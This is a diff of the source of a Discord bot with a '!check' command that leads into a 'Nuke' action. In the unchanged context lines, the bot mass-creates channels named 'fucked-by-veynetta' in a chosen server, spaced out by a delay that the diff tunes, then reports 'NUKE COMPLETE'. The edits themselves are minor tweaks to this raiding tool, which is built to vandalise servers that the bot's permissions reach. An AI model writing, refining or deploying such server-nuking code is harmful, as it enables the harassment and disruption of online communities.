@@ -25,7 +25,8 @@ const app = express();
 app.get('/', (req, res) => res.send('Bot Online'));
 app.listen(process.env.PORT || 3000);
 
-const TOKEN = process.env.TOKEN;
+const TOKEN = process.env.TOKEN;        // Your bot token from .env
+const CLIENT_ID = process.env.CLIENT_ID; // Application ID (not always needed for this code)
 
 const client = new Client({
   intents: [
@@ -40,7 +41,7 @@ client.once('ready', () => {
   console.log(`${client.user.tag} is online`);
 });
 
-// ====================== MESSAGE COMMANDS ======================
+// ====================== !CHECK COMMAND ======================
 client.on('messageCreate', async message => {
   if (message.author.bot || !message.guild) return;
   const content = message.content.trim().toLowerCase();
@@ -76,7 +77,6 @@ client.on('interactionCreate', async interaction => {
       return interaction.reply({ content: '❌ This is not for you.', flags: MessageFlags.Ephemeral });
     }
 
-    // ====================== !CHECK FLOW ======================
     if (action === 'check') {
       if (interaction.isButton() && interaction.customId.startsWith('check_start_')) {
         const modal = new ModalBuilder()
@@ -125,7 +125,7 @@ client.on('interactionCreate', async interaction => {
           .addOptions([{ label: '☢️ Nuke', value: 'nuke' }]);
 
         await interaction.editReply({
-          content: `**Selected Server:** ${guild.name}\nChoose action:`,
+          content: `**Selected:** ${guild.name}`,
           components: [new ActionRowBuilder().addComponents(actionSelect)]
         });
       }
@@ -170,7 +170,7 @@ client.on('interactionCreate', async interaction => {
             try {
               await guild.channels.create({ name: 'fucked-by-veynetta', type: 0 });
               created++;
-              await delay(700);
+              await delay(800);
             } catch {}
           }
 
@@ -184,7 +184,6 @@ client.on('interactionCreate', async interaction => {
           await interaction.editReply({ 
             content: `✅ **NUKE COMPLETE**\nCreated **${created}** channels named \`fucked-by-veynetta\`` 
           });
-
         } catch (err) {
           console.error(err);
           await interaction.editReply({ content: '⚠️ Nuke partially completed.' }).catch(() => {});
